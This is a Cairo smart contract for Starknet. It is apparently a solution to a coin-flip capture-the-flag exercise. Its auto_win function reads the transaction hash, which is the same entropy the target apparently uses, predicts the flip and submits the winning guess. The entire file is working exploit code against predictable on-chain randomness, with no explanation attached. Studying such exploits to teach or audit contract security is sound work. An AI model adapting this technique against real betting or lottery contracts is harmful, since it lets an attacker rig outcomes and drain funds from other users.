#[starknet::interface]
trait ICoinFlipExploit<TContractState> {
    fn auto_win(ref self: TContractState);
}

#[starknet::interface]
trait ICoinFlipTrait<TContractState> {
    fn isComplete(self: @TContractState) -> bool;
    fn guess(ref self: TContractState, guess: felt252) -> bool;
    fn getConsecutiveWins(self: @TContractState) -> u8;
}


#[starknet::contract]
mod CoinFlipExploit {
    use coinflip::coinflip_exploit::ICoinFlipTraitDispatcherTrait;
    use starknet::ContractAddress;
    use starknet::get_block_info;
    use starknet::get_caller_address;
    use starknet::get_tx_info;
    use super::ICoinFlipTraitDispatcher;

    const HEAD: felt252 = 1;
    const TAIL: felt252 = 0;

    #[storage]
    struct Storage {
        coinflip: ContractAddress
    }

    #[constructor]
    fn constructor(ref self: ContractState, _coinflip: ContractAddress) {
        self.coinflip.write(_coinflip);
    }

    #[abi(embed_v0)]
    impl CoinFlipExploit of super::ICoinFlipExploit<ContractState> {
        fn auto_win(ref self: ContractState) {
            let predicted_win = self.compute_answer();
            ICoinFlipTraitDispatcher { contract_address: self.coinflip.read() }
                .guess(predicted_win);
        }
    }

    #[generate_trait]
    impl PrivateMethods of PrivateMethodsTrait {
        /// @notice computes the if the answer given is the righ answer
        /// @dev interanl function
        /// @return status (felt252): ( HEAD or TAIL )
        fn compute_answer(self: @ContractState) -> felt252 {
            let txInfo = get_tx_info();
            let entropy: u256 = txInfo.unbox().transaction_hash.into();
            if (entropy.low % 2 == 0) {
                return HEAD;
            }
            return TAIL;
        }
    }
}
